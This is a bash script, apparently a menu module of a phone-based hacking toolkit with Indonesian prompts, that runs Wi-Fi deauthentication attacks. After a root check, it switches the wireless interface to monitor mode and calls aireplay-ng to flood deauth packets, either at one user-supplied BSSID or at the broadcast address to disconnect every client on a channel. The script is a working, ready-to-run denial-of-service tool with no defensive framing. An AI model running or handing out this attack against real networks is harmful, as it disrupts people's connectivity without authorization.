#!/usr/bin/env bash
# ============================================
#   MODULE: CHOKE THE HUNTERS (Smart Fallback)
# ============================================

if [ -f "./bxp_libcore.sh" ]; then source ./bxp_libcore.sh; fi

show_ascii() {
    clear
    echo -e "\033[38;2;255;215;0m" # EMAS
    cat <<'ASCII'
██████╗██╗  ██╗ ██████╗ ██╗  ██╗███████╗    ████████╗██╗  ██╗███████╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ ███████╗
██╔════╝██║  ██║██╔═══██╗██║ ██╔╝██╔════╝    ╚══██╔══╝██║  ██║██╔════╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗██╔════╝
██║     ███████║██║   ██║█████╔╝ █████╗         ██║   ███████║█████╗      ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝███████╗
██║     ██╔══██║██║   ██║██╔═██╗ ██╔══╝         ██║   ██╔══██║██╔══╝      ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗╚════██║
╚██████╗██║  ██║╚██████╔╝██║  ██╗███████╗       ██║   ██║  ██║███████╗    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║███████║
 ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝       ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝
ASCII
    echo -e "\033[0m\n"
}

while true; do
    show_ascii
    
    if [ "$(id -u)" -eq 0 ]; then
        ROOT_MODE=1
        STATUS_MSG="\033[1;32m[+] ROOT MODE ACTIVE\033[0m"
    else
        ROOT_MODE=0
        STATUS_MSG="\033[1;33m[!] NON-ROOT MODE (LIMITED)\033[0m"
    fi

    echo -e "${C}======================================================${N}"
    echo -e "${W}    SMART DEAUTH ATTACK ENGINE${N}"
    echo -e "    Status: $STATUS_MSG"
    echo -e "${C}======================================================${N}"
    echo ""
    
    if [ "$ROOT_MODE" -eq 1 ]; then
        echo -e "  \033[1;32m[1]\033[0m  \033[1;37mTargeted Deauth (1 BSSID)\033[0m"
        echo -e "  \033[1;32m[2]\033[0m  \033[1;37mMass Deauth (Semua Client)\033[0m"
    else
        echo -e "  \033[1;30m[1] Targeted Deauth (Requires Root)\033[0m"
        echo -e "  \033[1;30m[2] Mass Deauth (Requires Root)\033[0m"
    fi
    echo ""
    echo -e "  \033[1;31m[0]\033[0m  \033[1;37mBack to Main Menu\033[0m"
    echo ""
    echo -e "${C}------------------------------------------------------${N}"
    echo -ne "  ${Y}Select option > ${N}"
    read -r choke_choice

    # Cek root HANYA kalau milih opsi 1 atau 2 (Tombol 0 di-skip)
    if [ "$choke_choice" = "1" ] || [ "$choke_choice" = "2" ]; then
        if [ "$ROOT_MODE" -eq 0 ]; then
            echo -e "\n\033[0;31m[!] FITUR INI MEMBUTUHKAN ROOT (SU/MAGISK).\033[0m"
            echo -e "\033[0;33m    Di mode Non-Root, Deauth tidak bisa dijalankan.\033[0m"
            read -p "Press Enter..."; continue
        fi
    fi

    case "$choke_choice" in
        1)
            echo -e "\n${Y}[*] Menyiapkan Targeted Deauth...${N}"
            IFACE=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -n 1)
            read -p "Masukkan BSSID Target: " BSSID
            read -p "Masukkan Channel Target: " CHAN
            read -p "Jumlah packet Deauth (default 50): " DEAUTH_COUNT
            DEAUTH_COUNT=${DEAUTH_COUNT:-50}
            svc wifi disable 2>/dev/null; ip link set "$IFACE" down 2>/dev/null
            iw dev "$IFACE" set type monitor 2>/dev/null; ip link set "$IFACE" up 2>/dev/null
            iw dev "$IFACE" set channel "$CHAN" 2>/dev/null
            echo -e "\n${R}[*] Meluncurkan Deauth ke $BSSID...${N}"
            aireplay-ng --deauth "$DEAUTH_COUNT" -a "$BSSID" "$IFACE"
            ip link set "$IFACE" down 2>/dev/null; iw dev "$IFACE" set type managed 2>/dev/null; ip link set "$IFACE" up 2>/dev/null; svc wifi enable 2>/dev/null
            read -p "Press Enter to continue..."
            ;;
        2)
            echo -e "\n${Y}[*] Menyiapkan Mass Deauth...${N}"
            IFACE=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -n 1)
            read -p "Masukkan Channel Target: " CHAN
            read -p "Jumlah packet Deauth (default 10): " DEAUTH_COUNT
            DEAUTH_COUNT=${DEAUTH_COUNT:-10}
            svc wifi disable 2>/dev/null; ip link set "$IFACE" down 2>/dev/null
            iw dev "$IFACE" set type monitor 2>/dev/null; ip link set "$IFACE" up 2>/dev/null
            iw dev "$IFACE" set channel "$CHAN" 2>/dev/null
            echo -e "\n${R}[*] Meluncurkan Mass Deauth di Channel $CHAN...${N}"
            aireplay-ng --deauth "$DEAUTH_COUNT" -a "FF:FF:FF:FF:FF:FF" "$IFACE"
            ip link set "$IFACE" down 2>/dev/null; iw dev "$IFACE" set type managed 2>/dev/null; ip link set "$IFACE" up 2>/dev/null; svc wifi enable 2>/dev/null
            read -p "Press Enter to continue..."
            ;;
        0) exit 0 ;;
        *) echo -e "  ${R}[!] Invalid choice.${N}"; sleep 1 ;;
    esac
done
